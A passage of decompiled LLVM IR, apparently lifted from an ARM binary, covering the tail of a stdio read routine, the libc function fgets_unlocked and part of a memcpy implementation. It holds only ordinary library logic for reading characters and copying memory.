  %v1_172dc = inttoptr i32 %v0_172a0 to i16*
  store i32 %v0_172a0, i32* %r0.global-to-local, align 4
  %v2_172e0 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_172e0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_172e8 = call i32 @__stdio_READ(i16* %v1_172dc, i32 %v2_172e0, i32 1)
  store i32 %v5_172e8, i32* %r0.global-to-local, align 4
  %v2_172ec = icmp eq i32 %v5_172e8, 0
  br i1 %v2_172ec, label %dec_label_pc_172f8, label %bb24

bb24:                                             ; preds = %dec_label_pc_172dc
  %v4_172f0 = load i8, i8* %stack_var_-17, align 1
  %v5_172f0 = sext i8 %v4_172f0 to i32
  store i32 %v5_172f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172fc

dec_label_pc_172f8:                               ; preds = %dec_label_pc_172dc, %dec_label_pc_17220, %dec_label_pc_172b0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172fc

dec_label_pc_172fc:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_172c4, %dec_label_pc_1723c, %dec_label_pc_172f8
  %v2_17300 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17300, i32* @r4, align 4
  store i32 %v6_171e4, i32* @r5, align 4
  store i32 %v9_171e4, i32* @lr, align 4
  %v1_17304 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17304

; uselistorder directives
  uselistorder i32 %v2_17264, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17270, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_171e8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_172fc, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_172f8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_17310 = load i32, i32* @r6, align 4
  %v12_17310 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17314 = icmp eq i32 %arg2, 0
  store i1 %v2_17314, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1739c, label %dec_label_pc_17384.preheader

dec_label_pc_17384.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_173842 = add i32 %arg2, -1
  store i32 %v1_173842, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_173848 = icmp eq i32 %arg2, 1
  store i1 %v7_173848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_173848, label %dec_label_pc_1738c, label %dec_label_pc_17330

dec_label_pc_17330:                               ; preds = %dec_label_pc_17384.preheader, %dec_label_pc_17384.backedge.dec_label_pc_17330_crit_edge
  %v0_17354 = phi i32 [ %v0_17330.pre, %dec_label_pc_17384.backedge.dec_label_pc_17330_crit_edge ], [ %arg3, %dec_label_pc_17384.preheader ]
  %v1_17330 = add i32 %v0_17354, 16
  %v2_17330 = inttoptr i32 %v1_17330 to i32*
  %v3_17330 = load i32, i32* %v2_17330, align 4
  store i32 %v3_17330, i32* %r2.global-to-local, align 4
  %v1_17334 = add i32 %v0_17354, 24
  %v2_17334 = inttoptr i32 %v1_17334 to i32*
  %v3_17334 = load i32, i32* %v2_17334, align 4
  store i32 %v3_17334, i32* %r3.global-to-local, align 4
  %v3_17338 = icmp uge i32 %v3_17330, %v3_17334
  store i1 %v3_17338, i1* %cpsr_c.global-to-local, align 1
  %v9_17338 = icmp eq i32 %v3_17330, %v3_17334
  store i1 %v9_17338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17338, label %dec_label_pc_17354, label %dec_label_pc_17340

dec_label_pc_17340:                               ; preds = %dec_label_pc_17330
  %v1_17340 = inttoptr i32 %v3_17330 to i8*
  %v2_17340 = load i8, i8* %v1_17340, align 1
  %v3_17340 = zext i8 %v2_17340 to i32
  store i32 %v3_17340, i32* %r3.global-to-local, align 4
  %v5_17340 = add i32 %v3_17330, 1
  store i32 %v5_17340, i32* %r2.global-to-local, align 4
  %v2_17344 = load i32, i32* @r5, align 4
  %v3_17344 = inttoptr i32 %v2_17344 to i8*
  store i8 %v2_17340, i8* %v3_17344, align 1
  %v4_17344 = load i32, i32* @r5, align 4
  %v5_17344 = add i32 %v4_17344, 1
  store i32 %v5_17344, i32* @r5, align 4
  %v0_17348 = load i32, i32* %r3.global-to-local, align 4
  %v2_17348 = icmp ugt i32 %v0_17348, 9
  store i1 %v2_17348, i1* %cpsr_c.global-to-local, align 1
  %v7_17348 = icmp eq i32 %v0_17348, 10
  store i1 %v7_17348, i1* %cpsr_z.global-to-local, align 1
  %v0_1734c = load i32, i32* %r2.global-to-local, align 4
  %v1_1734c = load i32, i32* @r4, align 4
  %v2_1734c = add i32 %v1_1734c, 16
  %v3_1734c = inttoptr i32 %v2_1734c to i32*
  store i32 %v0_1734c, i32* %v3_1734c, align 4
  br i1 %v7_17348, label %dec_label_pc_1738c, label %dec_label_pc_17384.backedge

dec_label_pc_17354:                               ; preds = %dec_label_pc_17330
  %v1_17354 = inttoptr i32 %v0_17354 to i16*
  %v3_17358 = call i32 @getc_unlocked(i16* %v1_17354)
  %v3_1735c = icmp eq i32 %v3_17358, -1
  store i1 %v3_1735c, i1* %cpsr_c.global-to-local, align 1
  %v8_1735c = icmp eq i32 %v3_17358, -1
  store i1 %v8_1735c, i1* %cpsr_z.global-to-local, align 1
  %v1_17360 = urem i32 %v3_17358, 256
  store i32 %v1_17360, i32* %r3.global-to-local, align 4
  br i1 %v3_1735c, label %dec_label_pc_17368, label %dec_label_pc_17380

dec_label_pc_17368:                               ; preds = %dec_label_pc_17354
  %v0_17368 = load i32, i32* @r4, align 4
  %v1_17368 = inttoptr i32 %v0_17368 to i16*
  %v2_17368 = load i16, i16* %v1_17368, align 2
  %v3_17368 = zext i16 %v2_17368 to i32
  store i32 %v3_17368, i32* %r3.global-to-local, align 4
  %v1_1736c = and i32 %v3_17368, 8
  %v2_1736c = icmp eq i32 %v1_1736c, 0
  store i1 %v2_1736c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1736c, label %dec_label_pc_1738c, label %dec_label_pc_1739c

dec_label_pc_17380:                               ; preds = %dec_label_pc_17354
  %v1_17378 = trunc i32 %v3_17358 to i8
  %v2_17378 = load i32, i32* @r5, align 4
  %v3_17378 = inttoptr i32 %v2_17378 to i8*
  store i8 %v1_17378, i8* %v3_17378, align 1
  %v4_17378 = load i32, i32* @r5, align 4
  %v5_17378 = add i32 %v4_17378, 1
  store i32 %v5_17378, i32* @r5, align 4
  %v0_1737c = load i32, i32* %r3.global-to-local, align 4
  %v2_1737c = icmp ugt i32 %v0_1737c, 9
  store i1 %v2_1737c, i1* %cpsr_c.global-to-local, align 1
  %v7_1737c = icmp eq i32 %v0_1737c, 10
  store i1 %v7_1737c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1737c, label %dec_label_pc_1738c, label %dec_label_pc_17384.backedge

dec_label_pc_17384.backedge:                      ; preds = %dec_label_pc_17380, %dec_label_pc_17340
  %v0_17384 = load i32, i32* @r6, align 4
  %v1_17384 = add i32 %v0_17384, -1
  store i32 %v1_17384, i32* @r6, align 4
  %v2_17384 = icmp ne i32 %v0_17384, 0
  store i1 %v2_17384, i1* %cpsr_c.global-to-local, align 1
  %v7_17384 = icmp eq i32 %v0_17384, 1
  store i1 %v7_17384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17384, label %dec_label_pc_1738c, label %dec_label_pc_17384.backedge.dec_label_pc_17330_crit_edge

dec_label_pc_17384.backedge.dec_label_pc_17330_crit_edge: ; preds = %dec_label_pc_17384.backedge
  %v0_17330.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17330

dec_label_pc_1738c:                               ; preds = %dec_label_pc_17380, %dec_label_pc_17384.backedge, %dec_label_pc_17340, %dec_label_pc_17384.preheader, %dec_label_pc_17368
  %v0_1738c = load i32, i32* @r5, align 4
  %v1_1738c = load i32, i32* @r7, align 4
  %v3_1738c = icmp uge i32 %v0_1738c, %v1_1738c
  store i1 %v3_1738c, i1* %cpsr_c.global-to-local, align 1
  %v9_1738c = icmp eq i32 %v0_1738c, %v1_1738c
  store i1 %v9_1738c, i1* %cpsr_z.global-to-local, align 1
  %v2_17390 = xor i1 %v9_1738c, true
  %v3_17390 = and i1 %v3_1738c, %v2_17390
  br i1 %v3_17390, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1738c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_17394 = inttoptr i32 %v0_1738c to i8*
  store i8 0, i8* %v7_17394, align 1
  %v0_17398.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_17398.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1738c, %bb
  %v1_17398 = phi i1 [ %v1_17398.pre, %bb ], [ %v9_1738c, %dec_label_pc_1738c ]
  %v0_17398 = phi i1 [ %v0_17398.pre, %bb ], [ %v3_1738c, %dec_label_pc_1738c ]
  %v2_17398 = xor i1 %v1_17398, true
  %v3_17398 = and i1 %v0_17398, %v2_17398
  br i1 %v3_17398, label %.dec_label_pc_173a0_crit_edge, label %dec_label_pc_1739c

.dec_label_pc_173a0_crit_edge:                    ; preds = %.thread14
  %v0_173a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_173a0

dec_label_pc_1739c:                               ; preds = %entry, %dec_label_pc_17368, %.thread14
  br label %dec_label_pc_173a0

dec_label_pc_173a0:                               ; preds = %.dec_label_pc_173a0_crit_edge, %dec_label_pc_1739c
  %v0_173a0 = phi i32 [ %v0_173a0.pre, %.dec_label_pc_173a0_crit_edge ], [ 0, %dec_label_pc_1739c ]
  store i32 %v9_17310, i32* @r6, align 4
  store i32 %v12_17310, i32* @r7, align 4
  ret i32 %v0_173a0

; uselistorder directives
  uselistorder i1 %v9_1738c, { 1, 0, 2 }
  uselistorder i32 %v1_1738c, { 1, 0 }
  uselistorder i32 %v0_1738c, { 0, 2, 1 }
  uselistorder i32 %v0_17384, { 2, 0, 1 }
  uselistorder i32 %v0_1737c, { 1, 0 }
  uselistorder i32 %v3_17358, { 2, 1, 0, 3 }
  uselistorder i32 %v0_17348, { 1, 0 }
  uselistorder i32 %v3_17330, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17354, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_173a0, { 1, 0 }
  uselistorder label %dec_label_pc_1739c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1738c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_17330, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_173b0 = load i32, i32* @r1, align 4
  %v1_173b0 = load i32, i32* @r0, align 4
  %v2_173b0 = sub i32 %v0_173b0, %v1_173b0
  %v3_173b0 = icmp ult i32 %v0_173b0, %v1_173b0
  %v4_173b0 = xor i32 %v1_173b0, %v0_173b0
  %v5_173b0 = xor i32 %v2_173b0, %v0_173b0
  %v6_173b0 = and i32 %v5_173b0, %v4_173b0
  %v7_173b0 = icmp slt i32 %v6_173b0, 0
  store i1 %v7_173b0, i1* %cpsr_v.global-to-local, align 1
  %v8_173b0 = icmp slt i32 %v2_173b0, 0
  store i1 %v8_173b0, i1* %cpsr_n.global-to-local, align 1
  %v9_173b0 = icmp eq i32 %v0_173b0, %v1_173b0
  store i1 %v9_173b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_173b0, label %dec_label_pc_17604, label %dec_label_pc_173b8

dec_label_pc_173b8:                               ; preds = %entry
  br i1 %v9_173b0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_173b8
  %merge = phi i32 [ %v0_173b0, %dec_label_pc_173b8 ], [ %v2_17698, %bb150 ], [ %v11_176b4, %bb153 ], [ %v7_176b4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_173b8
  %v5_173bc = inttoptr i32 %v1_173b0 to i8*
  store i8* %v5_173bc, i8** %stack_var_-8, align 4
  %v8_173bc = load i32, i32* @lr, align 4
  %v0_173c0 = load i32, i32* @r2, align 4
  %v2_173c0 = add i32 %v0_173c0, -4
  store i32 %v2_173c0, i32* %r2.global-to-local, align 4
  %v4_173c0 = sub i32 3, %v0_173c0
  %v5_173c0 = and i32 %v4_173c0, %v0_173c0
  %v6_173c0 = icmp slt i32 %v5_173c0, 0
  store i1 %v6_173c0, i1* %cpsr_v.global-to-local, align 1
  %v7_173c0 = icmp slt i32 %v2_173c0, 0
  store i1 %v7_173c0, i1* %cpsr_n.global-to-local, align 1
  %v8_173c0 = icmp eq i32 %v0_173c0, 4
  store i1 %v8_173c0, i1* %cpsr_z.global-to-local, align 1
  %v5_173c4 = icmp slt i32 %v0_173c0, 4
  br i1 %v5_173c4, label %bb140, label %dec_label_pc_173c8

dec_label_pc_173c8:                               ; preds = %bb
  %v1_173c8 = urem i32 %v1_173b0, 4
  store i32 %v1_173c8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_173c8 = icmp eq i32 %v1_173c8, 0
  store i1 %v2_173c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_173c8, label %dec_label_pc_173d0, label %dec_label_pc_1747c

dec_label_pc_173d0:                               ; preds = %dec_label_pc_173c8
  %v1_173d0 = urem i32 %v0_173b0, 4
  store i32 %v1_173d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_173d0 = icmp eq i32 %v1_173d0, 0
  store i1 %v2_173d0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_173b0 to i2
  br i1 %v2_173d0, label %dec_label_pc_173d8, label %dec_label_pc_174ac

dec_label_pc_173d8:                               ; preds = %dec_label_pc_173d0, %dec_label_pc_174a4
  %v0_173f094 = phi i32 [ %v1_173b0, %dec_label_pc_173d0 ], [ %v0_175cc77, %dec_label_pc_174a4 ]
  %v0_173ec93 = phi i32 [ %v0_173b0, %dec_label_pc_173d0 ], [ %v0_174a4, %dec_label_pc_174a4 ]
  %v0_173d8 = phi i32 [ %v2_173c0, %dec_label_pc_173d0 ], [ %v2_1749c, %dec_label_pc_174a4 ]
  %v1_173d8 = add i32 %v0_173d8, -8
  store i32 %v1_173d8, i32* %r2.global-to-local, align 4
  %v3_173d8 = sub i32 7, %v0_173d8
  %v4_173d8 = and i32 %v3_173d8, %v0_173d8
  %v5_173d8 = icmp slt i32 %v4_173d8, 0
  store i1 %v5_173d8, i1* %cpsr_v.global-to-local, align 1
  %v6_173d8 = icmp slt i32 %v1_173d8, 0
  store i1 %v6_173d8, i1* %cpsr_n.global-to-local, align 1
  %v7_173d8 = icmp eq i32 %v0_173d8, 8
  store i1 %v7_173d8, i1* %cpsr_z.global-to-local, align 1
  %v2_173dc = xor i1 %v6_173d8, %v5_173d8
  br i1 %v2_173dc, label %dec_label_pc_1742c, label %dec_label_pc_173e0

dec_label_pc_173e0:                               ; preds = %dec_label_pc_173d8
  %v1_173e0 = add i32 %v0_173d8, -28
  store i32 %v1_173e0, i32* %r2.global-to-local, align 4
  %v3_173e0 = sub i32 27, %v0_173d8
  %v4_173e0 = and i32 %v3_173e0, %v1_173d8
  %v5_173e0 = icmp slt i32 %v4_173e0, 0
  store i1 %v5_173e0, i1* %cpsr_v.global-to-local, align 1
  %v6_173e0 = icmp slt i32 %v1_173e0, 0
  store i1 %v6_173e0, i1* %cpsr_n.global-to-local, align 1
  %v7_173e0 = icmp eq i32 %v1_173d8, 20
  store i1 %v7_173e0, i1* %cpsr_z.global-to-local, align 1
  %v2_173e4 = xor i1 %v6_173e0, %v5_173e0
  br i1 %v2_173e4, label %dec_label_pc_17418, label %dec_label_pc_173e8

dec_label_pc_173e8:                               ; preds = %dec_label_pc_173e0
  %v0_173e8 = load i32, i32* @r4, align 4
  store i32 %v0_173e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_173ec

dec_label_pc_173ec:                               ; preds = %dec_label_pc_173ec.dec_label_pc_173ec_crit_edge, %dec_label_pc_173e8
  %v0_173f0 = phi i32 [ %v12_173f8, %dec_label_pc_173ec.dec_label_pc_173ec_crit_edge ], [ %v0_173f094, %dec_label_pc_173e8 ]
  %v0_173ec = phi i32 [ %v0_173ec.pre, %dec_label_pc_173ec.dec_label_pc_173ec_crit_edge ], [ %v0_173ec93, %dec_label_pc_173e8 ]
  %v1_173ec = inttoptr i32 %v0_173ec to i32*
  %v2_173ec = load i32, i32* %v1_173ec, align 4
  %v3_173ec = add i32 %v0_173ec, 4
  %v4_173ec = inttoptr i32 %v3_173ec to i32*
  %v5_173ec = load i32, i32* %v4_173ec, align 4
  store i32 %v5_173ec, i32* %r4.global-to-local, align 4
  %v6_173ec = add i32 %v0_173ec, 8
  %v7_173ec = inttoptr i32 %v6_173ec to i32*
  %v8_173ec = load i32, i32* %v7_173ec, align 4
  store i32 %v8_173ec, i32* %ip.global-to-local, align 4
  %v9_173ec = add i32 %v0_173ec, 12
  %v10_173ec = inttoptr i32 %v9_173ec to i32*
  %v11_173ec = load i32, i32* %v10_173ec, align 4
  store i32 %v11_173ec, i32* %lr.global-to-local, align 4
  %v12_173ec = add i32 %v0_173ec, 16
  store i32 %v12_173ec, i32* %r1.global-to-local, align 4
  %v1_173f0 = inttoptr i32 %v0_173f0 to i32*
  store i32 %v2_173ec, i32* %v1_173f0, align 4
  %v3_173f0 = add i32 %v0_173f0, 4
  %v4_173f0 = inttoptr i32 %v3_173f0 to i32*
  %v5_173f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_173f0, i32* %v4_173f0, align 4
  %v6_173f0 = add i32 %v0_173f0, 8
  %v7_173f0 = inttoptr i32 %v6_173f0 to i32*
  %v8_173f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_173f0, i32* %v7_173f0, align 4
  %v9_173f0 = add i32 %v0_173f0, 12
  %v10_173f0 = inttoptr i32 %v9_173f0 to i32*
  %v11_173f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173f0, i32* %v10_173f0, align 4
  %v12_173f0 = add i32 %v0_173f0, 16
  store i32 %v12_173f0, i32* %r0.global-to-local, align 4
  %v0_173f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_173f4 = inttoptr i32 %v0_173f4 to i32*
  %v2_173f4 = load i32, i32* %v1_173f4, align 4
  store i32 %v2_173f4, i32* @r3, align 4
  %v3_173f4 = add i32 %v0_173f4, 4
  %v4_173f4 = inttoptr i32 %v3_173f4 to i32*
  %v5_173f4 = load i32, i32* %v4_173f4, align 4
  store i32 %v5_173f4, i32* %r4.global-to-local, align 4
  %v6_173f4 = add i32 %v0_173f4, 8
  %v7_173f4 = inttoptr i32 %v6_173f4 to i32*
  %v8_173f4 = load i32, i32* %v7_173f4, align 4
  store i32 %v8_173f4, i32* @ip, align 4
  %v9_173f4 = add i32 %v0_173f4, 12
  %v10_173f4 = inttoptr i32 %v9_173f4 to i32*
  %v11_173f4 = load i32, i32* %v10_173f4, align 4
  store i32 %v11_173f4, i32* %lr.global-to-local, align 4
  %v12_173f4 = add i32 %v0_173f4, 16
  store i32 %v12_173f4, i32* @r1, align 4
  %v1_173f8 = inttoptr i32 %v12_173f0 to i32*
  store i32 %v2_173f4, i32* %v1_173f8, align 4
  %v3_173f8 = add i32 %v0_173f0, 20
  %v4_173f8 = inttoptr i32 %v3_173f8 to i32*
  %v5_173f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_173f8, i32* %v4_173f8, align 4
  %v6_173f8 = add i32 %v0_173f0, 24
  %v7_173f8 = inttoptr i32 %v6_173f8 to i32*
  %v8_173f8 = load i32, i32* @ip, align 4
  store i32 %v8_173f8, i32* %v7_173f8, align 4
  %v9_173f8 = add i32 %v0_173f0, 28
  %v10_173f8 = inttoptr i32 %v9_173f8 to i32*
  %v11_173f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173f8, i32* %v10_173f8, align 4
  %v12_173f8 = add i32 %v0_173f0, 32
  store i32 %v12_173f8, i32* @r0, align 4
  %v0_173fc = load i32, i32* %r2.global-to-local, align 4
  %v1_173fc = add i32 %v0_173fc, -32
  store i32 %v1_173fc, i32* %r2.global-to-local, align 4
  %v3_173fc = sub i32 31, %v0_173fc
  %v4_173fc = and i32 %v3_173fc, %v0_173fc
  %v5_173fc = icmp slt i32 %v4_173fc, 0
  %v6_173fc = icmp slt i32 %v1_173fc, 0
  %v2_17400 = xor i1 %v6_173fc, %v5_173fc
  br i1 %v2_17400, label %dec_label_pc_17404, label %dec_label_pc_173ec.dec_label_pc_173ec_crit_edge

dec_label_pc_173ec.dec_label_pc_173ec_crit_edge:  ; preds = %dec_label_pc_173ec
  %v0_173ec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_173ec

dec_label_pc_17404:                               ; preds = %dec_label_pc_173ec
  %v1_17404 = add i32 %v0_173fc, -16
  %v3_17404 = add i32 %v0_173fc, 2147483616
  %v4_17404 = and i32 %v1_17404, %v3_17404
  %v5_17404 = icmp slt i32 %v4_17404, 0
  store i1 %v5_17404, i1* %cpsr_v.global-to-local, align 1
  %v6_17404 = icmp slt i32 %v1_17404, 0
  store i1 %v6_17404, i1* %cpsr_n.global-to-local, align 1
  %v7_17404 = icmp eq i32 %v1_17404, 0
  store i1 %v7_17404, i1* %cpsr_z.global-to-local, align 1
  %v2_17408 = xor i1 %v6_17404, %v5_17404
  br i1 %v2_17408, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_17404
  %v3_17408 = load i32, i32* @r1, align 4
  %v4_17408 = inttoptr i32 %v3_17408 to i32*
  %v5_17408 = load i32, i32* %v4_17408, align 4
  store i32 %v5_17408, i32* @r3, align 4
  %v6_17408 = add i32 %v3_17408, 4
  %v7_17408 = inttoptr i32 %v6_17408 to i32*
  %v8_17408 = load i32, i32* %v7_17408, align 4
  store i32 %v8_17408, i32* %r4.global-to-local, align 4
  %v9_17408 = add i32 %v3_17408, 8
  %v10_17408 = inttoptr i32 %v9_17408 to i32*
  %v11_17408 = load i32, i32* %v10_17408, align 4
  store i32 %v11_17408, i32* @ip, align 4
  %v12_17408 = add i32 %v3_17408, 12
  %v13_17408 = inttoptr i32 %v12_17408 to i32*
  %v14_17408 = load i32, i32* %v13_17408, align 4
  store i32 %v14_17408, i32* %lr.global-to-local, align 4
  %v15_17408 = add i32 %v3_17408, 16
  store i32 %v15_17408, i32* @r1, align 4
  %v4_1740c = inttoptr i32 %v12_173f8 to i32*
  store i32 %v5_17408, i32* %v4_1740c, align 4
  %v6_1740c = add i32 %v0_173f0, 36
  %v7_1740c = inttoptr i32 %v6_1740c to i32*
  %v8_1740c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1740c, i32* %v7_1740c, align 4
  %v9_1740c = add i32 %v0_173f0, 40
  %v10_1740c = inttoptr i32 %v9_1740c to i32*
  %v11_1740c = load i32, i32* @ip, align 4
  store i32 %v11_1740c, i32* %v10_1740c, align 4
  %v12_1740c = add i32 %v0_173f0, 44
  %v13_1740c = inttoptr i32 %v12_1740c to i32*
  %v14_1740c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1740c, i32* %v13_1740c, align 4
  %v15_1740c = add i32 %v0_173f0, 48
  store i32 %v15_1740c, i32* @r0, align 4
  %v3_17410 = load i32, i32* %r2.global-to-local, align 4
  %v4_17410 = add i32 %v3_17410, -16
  store i32 %v4_17410, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_17404, %bb136
  %v3_17420102111 = phi i32 [ %v15_1740c, %bb136 ], [ %v12_173f8, %dec_label_pc_17404 ]
  %v0_17418.pre = phi i32 [ %v4_17410, %bb136 ], [ %v1_173fc, %dec_label_pc_17404 ]
  %v2_17414 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17414, i32* @r4, align 4
  br label %dec_label_pc_17418

dec_label_pc_17418:                               ; preds = %dec_label_pc_173e0, %bb137
  %v3_17420101 = phi i32 [ %v0_173f094, %dec_label_pc_173e0 ], [ %v3_17420102111, %bb137 ]
  %v0_17418 = phi i32 [ %v1_173e0, %dec_label_pc_173e0 ], [ %v0_17418.pre, %bb137 ]
  %v1_17418 = add i32 %v0_17418, 20
  store i32 %v1_17418, i32* %r2.global-to-local, align 4
  %v3_17418 = sub i32 0, %v0_17418
  %v4_17418 = and i32 %v1_17418, %v3_17418
  %v5_17418 = icmp slt i32 %v4_17418, 0
  store i1 %v5_17418, i1* %cpsr_v.global-to-local, align 1
  %v6_17418 = icmp slt i32 %v1_17418, 0
  store i1 %v6_17418, i1* %cpsr_n.global-to-local, align 1
  %v7_17418 = icmp eq i32 %v1_17418, 0
  store i1 %v7_17418, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1741c

dec_label_pc_1741c:                               ; preds = %.thread115, %dec_label_pc_17418
  %v0_1742c.pre157 = phi i32 [ %v0_1742c.pre, %.thread115 ], [ %v1_17418, %dec_label_pc_17418 ]
  %v3_17420 = phi i32 [ %v3_1742099116, %.thread115 ], [ %v3_17420101, %dec_label_pc_17418 ]
  %v1_17424 = phi i1 [ %v1_17428, %.thread115 ], [ %v5_17418, %dec_label_pc_17418 ]
  %v0_17424 = phi i1 [ %v0_17428, %.thread115 ], [ %v6_17418, %dec_label_pc_17418 ]
  %v2_1741c = xor i1 %v1_17424, %v0_17424
  br i1 %v2_1741c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1741c
  %v3_1741c = load i32, i32* @r1, align 4
  %v4_1741c = inttoptr i32 %v3_1741c to i32*
  %v5_1741c = load i32, i32* %v4_1741c, align 4
  store i32 %v5_1741c, i32* @r3, align 4
  %v6_1741c = add i32 %v3_1741c, 4
  %v7_1741c = inttoptr i32 %v6_1741c to i32*
  %v8_1741c = load i32, i32* %v7_1741c, align 4
  store i32 %v8_1741c, i32* @ip, align 4
  %v9_1741c = add i32 %v3_1741c, 8
  %v10_1741c = inttoptr i32 %v9_1741c to i32*
  %v11_1741c = load i32, i32* %v10_1741c, align 4
  store i32 %v11_1741c, i32* %lr.global-to-local, align 4
  %v12_1741c = add i32 %v3_1741c, 12
  store i32 %v12_1741c, i32* @r1, align 4
  %v4_17420 = inttoptr i32 %v3_17420 to i32*
  store i32 %v5_1741c, i32* %v4_17420, align 4
  %v6_17420 = add i32 %v3_17420, 4
  %v7_17420 = inttoptr i32 %v6_17420 to i32*
  %v8_17420 = load i32, i32* @ip, align 4
  store i32 %v8_17420, i32* %v7_17420, align 4
  %v9_17420 = add i32 %v3_17420, 8
  %v10_17420 = inttoptr i32 %v9_17420 to i32*
  %v11_17420 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17420, i32* %v10_17420, align 4
  %v12_17420 = add i32 %v3_17420, 12
  store i32 %v12_17420, i32* @r0, align 4
  %v3_17424 = load i32, i32* %r2.global-to-local, align 4
  %v4_17424 = add i32 %v3_17424, -12
  store i32 %v4_17424, i32* %r2.global-to-local, align 4
  %v6_17424 = sub i32 11, %v3_17424
  %v7_17424 = and i32 %v6_17424, %v3_17424
  %v8_17424 = icmp slt i32 %v7_17424, 0
  store i1 %v8_17424, i1* %cpsr_v.global-to-local, align 1
  %v9_17424 = icmp slt i32 %v4_17424, 0
  store i1 %v9_17424, i1* %cpsr_n.global-to-local, align 1
  %v10_17424 = icmp eq i32 %v3_17424, 12
  store i1 %v10_17424, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1741c, %bb138
  %v0_1742c.pre = phi i32 [ %v4_17424, %bb138 ], [ %v0_1742c.pre157, %dec_label_pc_1741c ]
  %v3_1742099116 = phi i32 [ %v12_17420, %bb138 ], [ %v3_17420, %dec_label_pc_1741c ]
